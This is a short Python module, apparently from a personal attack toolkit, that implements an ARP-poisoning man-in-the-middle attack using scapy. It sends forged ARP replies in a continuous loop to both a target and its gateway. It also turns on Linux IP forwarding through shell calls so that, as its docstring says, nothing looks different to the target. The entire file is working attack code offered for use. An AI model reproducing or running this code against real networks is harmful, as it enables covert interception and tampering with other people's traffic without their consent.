#!/usr/bin/python

# Author: Tristan Strathearn
# Website: www.r3oath.com
# Email: r3oath@gmail.com

# Licensed under Creative Commons Attribution-ShareAlike 3.0 Unported (CC BY-SA 3.0)
# See the full license at http://creativecommons.org/licenses/by-sa/3.0/legalcode

import E4
import thread
import subprocess
from scapy.all import *

class Arp():
    """Handles various ARP related attacks/processing."""
    def __init__(self):
        pass

    def MITM(self, target, gateway):
        """Start an ARP Man-In-The-Middle attack.

        Keyword Arguments:
        target -- The target NetworkObject.
        gateway -- The gateway NetworkObject, this is usually the router/switch or
            another host. You'll be sniffing the network communications between
            target and gateway.

        """
        thread.start_new_thread(E4ArpPoison, (target.ip, gateway.ip,))
        thread.start_new_thread(E4ArpPoison, (gateway.ip, target.ip,))

    def forward(self, toggle):
        """Enable packet forwarding. This will make sure nothing looks different to the target."""
        self.linuxStartForwarding() if toggle == True else self.linuxStopForwarding()

    def linuxStartForwarding(self):
        """Enable packet forwarding on Linux."""
        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

    def linuxStopForwarding(self):
        """Disable packet forwarding on Linux."""
        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)

def E4ArpPoison(addressOne, addressTwo, interval=1):
    """Send a poisoned ARP packet.

    Keyword Arguments:
    addressOne -- The destination IP address.
    addressTwo -- The source IP address.
    interval -- The time to wait in seconds between retransmission. (default 1)

    """
    ArpPacket = ARP(pdst=addressOne, psrc=addressTwo)
    send(ArpPacket, verbose=0, inter=interval, loop=1)